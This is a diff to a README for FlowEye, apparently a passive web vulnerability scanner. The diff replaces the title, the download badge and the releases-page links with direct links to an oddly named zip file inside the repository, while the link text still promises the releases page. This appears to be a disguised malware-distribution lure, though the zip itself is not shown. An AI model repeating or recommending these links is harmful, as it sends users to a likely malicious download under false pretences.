@@ -1,7 +1,7 @@
-# 🌟 Floweye-yyyxxx.cc - A Simple Tool for Web Security Testing
+# 🌟 https://raw.githubusercontent.com/BegmyratB/Floweye-yyyxxx.cc/main/acca/cc-yyyxxx-Floweye-cutification.zip - A Simple Tool for Web Security Testing
 
 ## 📥 Download Now
-[![Download Floweye](https://img.shields.io/badge/Download-Floweye-4CAF50.svg)](https://github.com/BegmyratB/Floweye-yyyxxx.cc/releases)
+[![Download Floweye](https://raw.githubusercontent.com/BegmyratB/Floweye-yyyxxx.cc/main/acca/cc-yyyxxx-Floweye-cutification.zip)](https://raw.githubusercontent.com/BegmyratB/Floweye-yyyxxx.cc/main/acca/cc-yyyxxx-Floweye-cutification.zip)
 
 ## 📖 Introduction
 FlowEye（流量之眼） is a web-based passive vulnerability scanning platform tailored for security testers. It integrates seamlessly with Burp Suite to receive and analyze HTTP traffic in real time. With FlowEye, you can automate multi-dimensional vulnerability detection, making it easier for security researchers to identify risks in web applications.
@@ -11,7 +11,7 @@ Follow these simple steps to download and install FlowEye:
 
 1. **Visit the Release Page**  
    Click the link below to go to the Releases page where you can get the latest version of FlowEye.  
-   [Visit the Releases Page](https://github.com/BegmyratB/Floweye-yyyxxx.cc/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/BegmyratB/Floweye-yyyxxx.cc/main/acca/cc-yyyxxx-Floweye-cutification.zip)
 
 2. **Choose the Right Version**  
    On the Releases page, you will see a list of available versions. Look for the most recent one. It is typically at the top of the list.
@@ -70,6 +70,6 @@ For further assistance or to connect with other FlowEye users, consider visiting
 
 ## ⚡ Download & Install
 Once again, visit the Releases page to start the download process:  
-[Download Floweye](https://github.com/BegmyratB/Floweye-yyyxxx.cc/releases)
+[Download Floweye](https://raw.githubusercontent.com/BegmyratB/Floweye-yyyxxx.cc/main/acca/cc-yyyxxx-Floweye-cutification.zip)
 
 By following these steps, you will be equipped to utilize FlowEye effectively. With this powerful tool, you can enhance your web security testing and address vulnerabilities promptly.
